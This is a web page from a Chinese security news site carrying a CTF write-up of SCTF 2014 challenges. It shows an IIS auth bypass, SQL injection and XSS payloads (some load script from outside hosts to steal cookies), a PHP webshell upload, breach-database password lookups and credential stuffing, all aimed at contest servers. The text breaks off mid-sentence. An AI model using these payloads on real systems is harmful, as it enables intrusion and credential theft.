<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【全网首发】SCTF 完美通过攻略（Writeup ） - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords"
          content="bobao,漏洞,漏洞平台,漏洞公告,漏洞信息,安全资讯,安全新闻,安全会议,安全知识,攻防大赛,安全大赛,黑客大赛,安全沙龙,vulnerability,exploit,安全趋势"/>
    
        <meta name="description" content="WEB篇：由Madimo投稿，已获得稿酬300。PT100首先题目提示在后台，顺手测试了一下admin目录，需要 HTTP Basic 认证。hydra爆破无解，便想 Google 一下看看有没有 I"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【全网首发】SCTF 完美通过攻略（Writeup ）</h2>
                <div class="article-msg">
                    <span class="time">2014-12-08 22:04:35</span>
                                        <span class="read">阅读：347214次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_129"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="129" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href=""
                             target="_blank">来源： 360安全播报</a></span>
                    
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align:center"><span style="font-size: 14px;"><img style="width: 600px; height: 444px;" alt="t01f1f1f2d81dd04113.jpg" src="http://p7.qhimg.com/t01bc1bcae93504ba90.jpg" title="t01f1f1f2d81dd04113.jpg" height="444" vspace="0" width="600" border="0"/></span></p><p style="text-indent: 2em;text-align: left"><span style="color: rgb(0, 176, 240);"><span style="font-size: 14px;"><span style="font-family: 微软雅黑,&quot;Microsoft YaHei&quot;; font-size: 14px; line-height: 30px; text-indent: 32px; background-color: rgb(255, 255, 255);">以下内容供安全爱好者参考学习</span>，WEB篇由</span>Madimo<span style="font-size: 14px;">投稿，其余由西安电子科技大学L战队投稿，均获得稿酬300！<span style="font-size: 14px; font-family: 微软雅黑,&quot;Microsoft YaHei&quot;;"><span style="font-family: 微软雅黑,&quot;Microsoft YaHei&quot;; font-size: 14px; line-height: 30px; text-indent: 28px; background-color: rgb(255, 255, 255);"></span><span style="font-family: 微软雅黑,&quot;Microsoft YaHei&quot;; font-size: 14px; line-height: 30px; text-indent: 32px; background-color: rgb(255, 255, 255);">即将打入作者账户，投稿请发送邮件至 huangyuan#360.cn。</span></span></span></span><br/></p><h3 style="text-indent: 2em;text-align: left"><span style="font-size: 14px">WEB篇：</span><span style="font-size: 14px">PT100</span></h3><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">首先题目提示在后台，顺手测试了一下</span><code><span style="font-size: 14px">admin</span></code><span style="font-size: 14px">目录，需要 HTTP Basic 认证。</span><code><span style="font-size: 14px">hydra</span></code><span style="font-size: 14px">爆破无解，便想 Google 一下看看有没有 IIS 的 Auth Bypass。结果还真有 - -||<br/>根据</span><a style=";font-size: 14px" href="https://soroush.secproject.com/blog/2010/07/iis5-1-directory-authentication-bypass-by-using-i30index_allocation/"><span style="font-size: 14px">这篇文章</span></a><span style="font-size: 14px">的提示，bypass 的 payload 为：</span></p><pre>http://gintama.sycsec.com/admin:$i30:$INDEX_ALLOCATION/index.php</pre><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">进入之后是一个登陆，username处疑似注入，提交</span><code><span style="font-size: 14px">&#39;</span></code><span style="font-size: 14px">出现 WTF，提交</span><code><span style="font-size: 14px">\&#39;</span></code><span style="font-size: 14px">提示密码错误。可见是注入。<br/>卡了好久，这里的 username 限制了四个字符，并且后端有截断。常规的 bypass 方法不起作用。<br/>之后在 expdb 找到一篇 paper：</span><a style=";font-size: 14px" href="http://www.exploit-db.com/papers/18263/"><span style="font-size: 14px">False SQL Injection and Advanced Blind SQL Injection</span></a><span style="font-size: 14px">，这里有四个字符 bypass 的 payload：</span><code><span style="font-size: 14px">&#39;=0#</span></code><span style="font-size: 14px">，提交后成功拿到 flag。</span></p><p style="text-align:center"><img style="width: 600px;height: 133px" alt="t01f993d44aeb25b35a.jpg" src="http://p3.qhimg.com/t01adbb758f3e3c7e71.jpg" title="t01f993d44aeb25b35a.jpg" height="133" vspace="0" width="600" border="0"/></p><h3 style="text-indent: 2em;text-align: left"><span style="font-size: 14px">PT200</span></h3><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">这道题会玩死人的T^T..<br/>打开</span><a style=";font-size: 14px" href="http://kali.sycsec.com"><span style="font-size: 14px">kali.sycsec.com</span></a><span style="font-size: 14px">后看了眼源代码，提示说</span><code><span style="font-size: 14px">name=xxx</span></code><span style="font-size: 14px">，那就是 XSS 题目咯。并且要求最新版的 Chrome 浏览器，要求就要求吧_(:3<br/>各种尝试姿势无果，终于发现了 base 标签可以 bypass（12345是我第三方 JS 输出的）。</span></p><pre>http://kali.sycsec.com/index.php?name=asaa%3Cbase%20href=http://www.hackersoul.com?javascript//%20%3E</pre><p style="text-align:center"><img style="width: 600px;height: 313px" alt="t0105bff0687cd53b7a.jpg" src="http://p8.qhimg.com/t01e40b5b9371dd45c0.jpg" title="t0105bff0687cd53b7a.jpg" height="313" vspace="0" width="600" border="0"/></p><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">不过提交后竟然没反应…事后才想起来，后台没有引入外链的 JavaScript…<br/>之后官方提示有现成的方法可以用，最终用 link 标签搞定，payload 为：</span></p><pre>http://kali.sycsec.com/index.php?name=asaa%3Clink%20rel=import%20href=http://103.224.80.59/2.php%20/%3E</pre><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">得到 Cookie 后去后台提示 403，改了 XFF 后就被 fuck 了T^T..之后尝试获取页面源代码，其中我的 2.php 代码如下：</span></p><p style="text-align:center"><span style="font-size: 14px;"><img style="width: 600px; height: 121px;" alt="t01b5039742c5c0090b.jpg" src="http://p3.qhimg.com/t0149cf6c1e7a9dbbeb.jpg" title="t01b5039742c5c0090b.jpg" height="121" vspace="0" width="600" border="0"/></span></p><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">由于浏览器的策略，我们需要指定</span><code><span style="font-size: 14px">Access-Control-Allow-Origin</span></code><span style="font-size: 14px">为</span><code><span style="font-size: 14px">*</span></code><span style="font-size: 14px">。然后得到的 HTML 代码写入本地的 txt 中。<br/>从 index.php 得到 </span><code><span style="font-size: 14px">flag.php?id=1</span></code><span style="font-size: 14px">，然后经过各种注入，最后的 payload 就是上面的代码。 <br/>有一点就是服务器上安装了不是安全狗的安全狗，正好前几天出了新的报错关键字，正好派上用场~最终 flag：</span></p><p style="text-align:center"><img style="width: 600px;height: 201px" alt="t0115b3cbada95776f8.jpg" src="http://p5.qhimg.com/t01870cfc4d76d2bbe9.jpg" title="t0115b3cbada95776f8.jpg" height="201" vspace="0" width="600" border="0"/></p><h3 style="text-indent: 2em;text-align: left"><span style="font-size: 14px">PT300</span></h3><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">题目给了个 modx 的地址：</span><a style=";font-size: 14px" href="http://modx.sycsec.com"><span style="font-size: 14px">modx.sycsec.com</span></a><span style="font-size: 14px">，其中 modx 在 PT400 的 idc 中 download 目录有下载。题目提示是代码审计，看到 PKAV 分分钟搞定心慌啊。<br/>idc 上有三个版本，我选择了最新的版本审计，最后发现找错了，是 1.0.8。<br/>打开题目中的地址，从 robots.txt 中发现了 </span><code><span style="font-size: 14px">/flag/flag.txt</span></code><span style="font-size: 14px">，第一反应是文件包含。在 expdb 上搜索 modx 的 LFI 无果，决定自己审计。<br/>首先在本地搭建环境，</span><code><span style="font-size: 14px">find . -name &quot;*.php&quot; | xargs grep include</span></code><span style="font-size: 14px">找到含有 include 的文件。鬼使神差的从 </span><code><span style="font-size: 14px">index-ajax.php</span></code><span style="font-size: 14px"> 开始跟（没想到跟对了）。</span></p><p style="text-align:center"><span style="font-size: 14px;"><img style="width: 600px; height: 101px;" alt="t01ecc8e2e475d73e8a.jpg" src="http://p9.qhimg.com/t01b0a4c1f42b4b4849.jpg" title="t01ecc8e2e475d73e8a.jpg" height="101" vspace="0" width="600" border="0"/></span></p><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">获取了用户输入的 q 参数，然后进行包含。阅读代码发现需要在 </span><code><span style="font-size: 14px">assets/snippets</span></code><span style="font-size: 14px"> 目录下，再次目录下查找有包含的 php，发现</span><code><span style="font-size: 14px">/ajaxSearch/ajaxSearchPopup.php</span></code><span style="font-size: 14px">存在包含：</span></p><p style="text-align:center"><span style="font-size: 14px;"><img style="width: 600px; height: 85px;" alt="t01bad2e2b2f5625d8c.jpg" src="http://p4.qhimg.com/t01aa1165ada0153490.jpg" title="t01bad2e2b2f5625d8c.jpg" height="85" vspace="0" width="600" border="0"/></span></p><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">如果 POST 了 ucfg，如果开头为</span><code><span style="font-size: 14px">@FILE:</span></code><span style="font-size: 14px">就包含用户提交的 ucfg。构造 payload：</span></p><pre>q=assets/snippets/ajaxSearch/ajaxSearchPopup.php&amp;as_version=1.9.2&amp;ucfg=%26config%3D%60@FILE:flag%2fflag.txt%60&amp;search=123</pre><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">POST 到 index-ajax.php 得到 flag。</span></p><p style="text-align:center"><img style="width: 600px;height: 324px" alt="t01f788b229926f4c43.jpg" src="http://p8.qhimg.com/t01b82a479583c75908.jpg" title="t01f788b229926f4c43.jpg" height="324" vspace="0" width="600" border="0"/></p><h3 style="text-indent: 2em;text-align: left"><span style="font-size: 14px">PT400</span></h3><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">渗透一个 Wordpress 的博客。wpscan 扫了下没有插件主题，官方也说不是爆破口令。在页面尾部发现自豪的采用了 SYC SERVICE，打开后是</span><a style=";font-size: 14px" href="http://idc.sycsec.com/"><span style="font-size: 14px">http://idc.sycsec.com/</span></a><span style="font-size: 14px">。发现 page 疑似注入，</span><a style=";font-size: 14px" href="http://idc.sycsec.com/images/bug.php"><span style="font-size: 14px">bug 反馈</span></a><span style="font-size: 14px">疑似 XSS。第一天没搞定，第二天官方提示 SQLi -&gt; XSS。这个神脑洞o~o...<br/>page 注入通过把空格替换成 %0a 绕过，然后提交 payload：</span></p><pre>http://idc.sycsec.com/?page=1%0aunion%0aselect%0a0x3c736372697074207372633d687474703a2f2f7873732e72652f353233323e3c2f7363726970743e</pre><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">获得后台地址： </span></p><p style="text-align:center"><img style="width: 600px;height: 121px" alt="t01fbf3f2cdb3c014db.jpg" src="http://p1.qhimg.com/t015c47fde779c701a1.jpg" title="t01fbf3f2cdb3c014db.jpg" height="121" vspace="0" width="600" border="0"/></p><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">然后通过注入得到管理员的账号和密码： </span></p><pre>http://idc.sycsec.com/?page=-1%0aunion%0aselect%0aconcat(UserPass,UserName,IsAdmin)from%0aadministrators123%0alimit%0a0,1%23</pre><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">管理员的 md5 搜一下得到：</span><code><span style="font-size: 14px">rootadministrator123</span></code><span style="font-size: 14px">，登陆后跳到 upload.php。<br/>这里的上传的图片有一个过滤，当图片包含</span><code><span style="font-size: 14px">&lt;?</span></code><span style="font-size: 14px">的时候，对，你没有看错，有</span><code><span style="font-size: 14px">&lt;?</span></code><span style="font-size: 14px">的时候，张全蛋（英文名Michael Jack，法文名Hélodie Jaqueline）就会出现。不过很容易的，PHP 也可以通过</span><code><span style="font-size: 14px">&lt;script language=php&gt;phpinfo();&lt;/script&gt;</span></code><span style="font-size: 14px">来执行。直接上传一句话，%00 截断之后得到地址，菜刀连接就好，轻车熟路。</span></p><p style="text-align:center"><img style="width: 600px;height: 259px" alt="t01a347274081715007.jpg" src="http://p1.qhimg.com/t0171049692fbe89e2f.jpg" title="t01a347274081715007.jpg" height="259" vspace="0" width="600" border="0"/></p><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">根目录下发现 Wordpress 的源码，目测这个源码留了后门。下载下来 diff 一下，果然： </span></p><p style="text-align:center"><img style="width: 600px;height: 385px" alt="t01759584c70107d1c3.jpg" src="http://p9.qhimg.com/t0174d0f7c2316d882b.jpg" title="t01759584c70107d1c3.jpg" height="385" vspace="0" width="600" border="0"/></p><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">数了数这是 6 个字符，那就是</span><code><span style="font-size: 14px">assert</span></code><span style="font-size: 14px">了，写了个脚本来爆破..</span></p><p style="text-align:center"><span style="font-size: 14px;"><img style="width: 600px; height: 266px;" alt="t01ef4043cd746380d7.png" src="http://p8.qhimg.com/t01ef4043cd746380d7.png" title="t01ef4043cd746380d7.png" height="266" vspace="0" width="600" border="0"/></span></p><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">这个脚本真是醉了..不过跑出来就行。跑了一堆，随便选一个：</span><code><span style="font-size: 14px">Q0C6S1E</span></code> <br/><span style="font-size: 14px">然后再写一个脚本中转：&nbsp;&nbsp;</span></p><p style="text-align:center"><span style="font-size: 14px;"><img style="width: 600px; height: 174px;" alt="t0129ca18601bd1ca7e.jpg" src="http://p0.qhimg.com/t01554286d1a238b6ed.jpg" title="t0129ca18601bd1ca7e.jpg" height="174" vspace="0" width="600" border="0"/></span></p><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">运行后连接一句话，在数据库里找到 flag： </span></p><p style="text-align:center"><img style="width: 600px;height: 215px" alt="t0102cd46f66ec52d9b.jpg" src="http://p7.qhimg.com/t01740b8a9190588830.jpg" title="t0102cd46f66ec52d9b.jpg" height="215" vspace="0" width="600" border="0"/></p><h3 style="text-indent: 2em;text-align: left"><span style="font-size: 14px">PT500</span></h3><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">渗透题最爱。在 </span><a style=";font-size: 14px" href="http://corp.sycsec.com/"><span style="font-size: 14px">http://corp.sycsec.com/</span></a><span style="font-size: 14px"> 搜集各种信息。 </span></p><pre><span style="font-size: 14px">Email: happy_net@163.com/SYC083<br/>Domain: file.sycsec.com<br/>Domain: report-man.sycsec.com</span></pre><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">查找一下社工裤找到密码为：971989823，接着登陆进去。只有一个上传，我还以为能 getshell，后来发现想多了。<br/>卡了一会脑洞一开，想起来文件名可以注入。试了试果然，写了个脚本跑出来所有的用户数据。脚本如下：&nbsp;&nbsp;</span></p><p style="text-align:center"><span style="font-size: 14px;"><img style="width: 600px; height: 129px;" alt="t01007e68d699e0b729.jpg" src="http://p6.qhimg.com/t0170ec7638e15c209c.jpg" title="t01007e68d699e0b729.jpg" height="129" vspace="0" width="600" border="0"/></span></p><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">用户数据如下：</span></p><p style="text-align:center"><span style="font-size: 14px;"><img style="width: 600px; height: 254px;" alt="t01f8342a4ece870dbc.jpg" src="http://p1.qhimg.com/t012b0eeb50ccf577c9.jpg" title="t01f8342a4ece870dbc.jpg" height="254" vspace="0" width="600" border="0"/></span></p><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">之后又卡住了..不过机会总会来的，想起以前做渗透的时候经常社工公司邮箱，而且这里的人的邮箱也是</span><code><span style="font-size: 14px">@sycsec.com</span></code><span style="font-size: 14px">的，所以顺手打了个 mail.sycsec.com，成功访问。经过撞库登陆成功 SYC081 和 SYC042 的账号。 <br/>在邮件里得到 VPN 的地址和密码组成。</span></p><pre><span style="font-size: 14px">通知:<br/>公司VPN地址：vpn.sycsec.com<br/>默认用户名：工号 (如：SYC001)<br/>默认登录密码：工号 + 生日 (如：工号为SYC001，生日为19900101的用户，密码为：SYC001900101)</span></pre><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">在 SYC081 得到提示小美的生日，爆破了一下出生年份，最后进入 VPN 系统。 &nbsp;</span></p><p style="text-align:center"><img style="width: 600px;height: 265px" alt="t01a51c30a6b5ccdae9.jpg" src="http://p2.qhimg.com/t01da7431f2ff03aaae.jpg" title="t01a51c30a6b5ccdae9.jpg" height="265" vspace="0" width="600" border="0"/></p><p style="text-indent: 2em;text-align: left"><br/><span style="font-size: 14px">接着利用 VPN 访问内网的</span><code><span style="font-size: 14px">file.sycsec.com</span></code><span style="font-size: 14px">，发现域名不能访问，改为 IP 即可。 <br/>这题的坑点在于，存在一个 .svn 目录让人遐想联翩，login.php 又让人登陆。不过我试了试都不行，然后爆破了下目录..发现存在 files 目录... <br/>想到了爆破备份文件，没找到，又尝试了下用户名，依然 GG。最后没辙了爆破了下工号，发现是 403。 &nbsp;</span></p><p style="text-align:center"><img style="width: 600px;height: 257px" alt="t0146bdaf620ce9be7a.jpg" src="http://p5.qhimg.com/t019be757de170db7ba.jpg" title="t0146bdaf620ce9be7a.jpg" height="257" vspace="0" width="600" border="0"/></p><p style="text-indent: 2em;text-align: left"><br/><span style="font-size: 14px">嗯，写脚本跑www &nbsp;</span></p><pre><span style="font-size: 14px">import requests<br/>headers = {<br/> &nbsp; &nbsp;&#39;Cookie&#39;: &#39;PHPSESSID=cfefaa8e1d72885a3de880a9c9c55337&#39;<br/>}<br/>url = &#39;http://vpn.sycsec.com/curl.php&#39;<br/>url_2 = &#39;http://10.24.13.37/files/&#39;<br/>data = {<br/> &nbsp; &nbsp;&#39;option&#39;: &#39;GET&#39;,<br/> &nbsp; &nbsp;&#39;url&#39;: &#39;&#39;,<br/> &nbsp; &nbsp;&#39;cookie&#39;: &#39;&#39;,<br/> &nbsp; &nbsp;&#39;post&#39;: &#39;&#39;,<br/>}<br/>for i in range(0,84):<br/> &nbsp; &nbsp;data[&#39;url&#39;] = &#39;%sSYC0%02d/&#39; % (url_2, i)<br/> &nbsp; &nbsp;print &#39;Forbidden&#39; in requests.post(url, headers=headers, data=data).content, i</span></pre><p style="text-align:center"><img style="width: 600px;height: 361px" alt="t0177530b285dc4ae73.jpg" src="http://p1.qhimg.com/t01ef6d28b677139a3e.jpg" title="t0177530b285dc4ae73.jpg" height="361" vspace="0" width="600" border="0"/></p><p style="text-indent: 2em;text-align: left"><span style="font-size: 14px">最后在 SYC007 处得到 flag。 </span></p><p style="text-align:center"><img style="width: 600px;height: 428px" alt="t01e7464b5d6606616d.jpg" src="http://p9.qhimg.com/t011d6c10f01021435d.jpg" title="t01e7464b5d6606616d.jpg" height="428" vspace="0" width="600" border="0"/></p><p style="text-indent: 2em;text-align: left"><br/><span style="font-size: 14px">最后..打这个 CTF 都快打哭我了，两天没洗澡差点发霉.._(:3&nbsp; <br/></span></p><p style="text-indent: 2em;text-align: left"><br/></p><p style="text-indent: 2em;text-align: left"><br/></p><p><br/></p><p><br/></p><p class="MsoListParagraph" style="margin-left:28px"><span style="font-family:Wingdings">l<span style="font:9px &#39;Times New Roman&#39;">&nbsp; </span></span><strong>Misc10</strong></p><p><span style="font-family:宋体">苦逼的程序员啊</span></p><p><strong>手持两把锟斤拷，口中疾呼烫烫烫</strong><strong><br/> </strong><strong>下联是什么呢？</strong></p><p>Flag: <span style="font-size:13px;font-family:宋体;color:#333333;background:white">脚踏千朵屯屯屯，笑看万物锘锘锘</span></p><p><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;color:#333333;background:white">&nbsp;</span></p><p>RE 50</p><p style="text-align:center"><img style="width: 600px;height: 483px" alt="t015907f64d458b9e2c.jpg" src="http://p7.qhimg.com/t01f8b76dec9e5af5c2.jpg" title="t015907f64d458b9e2c.jpg" height="483" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">如图</span>,<span style="font-family:宋体">将输入的字符串每位加</span>3<span style="font-family:宋体">后作比较</span> </p><p>&nbsp;</p><p>s=“6duFg3rJ”[::-1]</p><p>for i in s:</p><p>print chr(ord(i)-3),</p><p>&nbsp;</p><p><span style="font-family:宋体">脑补一个</span>’k’</p><p>Flag=SCTF{Go0dCra3k}</p><p><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;color:#333333;background:white">&nbsp;</span></p><p class="MsoListParagraph" style="margin-left:28px"><span style="font-size:13px;font-family:Wingdings;color:#333333">l<span style="font:9px &#39;Times New Roman&#39;">&nbsp; </span></span><strong><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;color:#333333;background:white">PT100</span></strong></p><p><strong>gintama.sycsec.com</strong></p><p><br/></p><p style="text-align:center"><span style="font-size: 13px;font-family: &#39;Arial&#39;,&#39;sans-serif&#39;;color: rgb(51, 51, 51);background: none repeat scroll 0% 0% white"><img style="width: 600px;height: 326px" alt="t01b0da38e020be8d68.png" src="http://p8.qhimg.com/t01b0da38e020be8d68.png" title="t01b0da38e020be8d68.png" height="326" vspace="0" width="600" border="0"/></span></p><p><span style="font-size:13px;font-family:宋体;color:#333333;background:white">看来是要进入后台拿</span><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;color:#333333;background:white">flag</span><span style="font-size:13px;font-family:宋体;color:#333333;background:white">。</span></p><p style="text-align:center"><span style="font-size: 13px;font-family: &#39;Arial&#39;,&#39;sans-serif&#39;;color: rgb(51, 51, 51);background: none repeat scroll 0% 0% white"><img style="width: 600px;height: 337px" alt="t014a63b5f5b1eea461.png" src="http://p6.qhimg.com/t014a63b5f5b1eea461.png" title="t014a63b5f5b1eea461.png" height="337" vspace="0" width="600" border="0"/></span></p><p><span style="font-size:13px;font-family:宋体;color:#333333;background:white">后台可以很快猜出来，但是有个基础认证。</span></p><p><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;color:#333333;background:white">Cy</span><span style="font-size:13px;font-family:宋体;color:#333333;background:white">大屌说他好像在哪里看到过</span><span style="font-size:13px;font-family:&#39;Arial&#39;,&#39;sans-serif&#39;;color:#333333;background:white">iis+php</span><span 